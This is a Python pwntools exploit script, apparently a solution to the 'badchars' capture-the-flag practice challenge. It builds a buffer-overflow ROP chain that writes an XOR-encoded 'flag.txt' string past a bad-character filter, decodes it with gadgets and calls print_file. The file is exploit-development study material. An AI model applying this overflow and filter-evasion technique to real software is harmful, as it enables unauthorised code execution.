#!/usr/bin/env python3
from pwn import *

elf = ELF('badchars')                 #context.binary

def convertASCII_to_Hex(value):
      res = ""
      for i in value:
            res += hex(ord(i))[2:]
      return res

def changeEndian(value):
      length = len(value)
      res = "0x"
      for i in range(length-1, 0, -2):
            res += value[i-1]+ value[i]
      return res      

def generateString(value):
      return int(changeEndian(convertASCII_to_Hex(value)), 16)
     
#badchars are: 'x', 'g', 'a', '.'
# in hex: 78, 67, 61, 2e
def xorByTwo(value):
    res = ""
    for i in value:
        res += chr(int(convertASCII_to_Hex(i), 16) ^ 2)
    print(res)
    return res

p = process(elf.path)

#Prepare the payload
junk = b"A"*40                                              
pop_r12_r13_r14_r15 = p64(0x000000000040069c)
pop_r14_r15 = p64(0x00000000004006a0)                               
data_address = 0x00601038                                   
flag = p64(generateString(xorByTwo("flag.txt")))            
xor_r14_r15 = p64(0x0000000000400628)
pop_rdi = p64(0x00000000004006a3)                           
print_file = p64(0x00400510)                                
mov_r13_r12 = p64(0x0000000000400634)

#payload
payload = junk
payload += pop_r12_r13_r14_r15
payload += flag + p64(data_address) + p64(1) + p64(1)       #For the last 2 registers you can write any 64bit integer 
payload += mov_r13_r12

for i in range(8):
    payload += pop_r14_r15
    payload += p64(2) + p64(data_address + i)
    payload += xor_r14_r15

payload += pop_rdi
payload += p64(data_address)
payload += print_file

# Send the payload

p.sendline(payload)                 #send the payload to the process

p.interactive()	
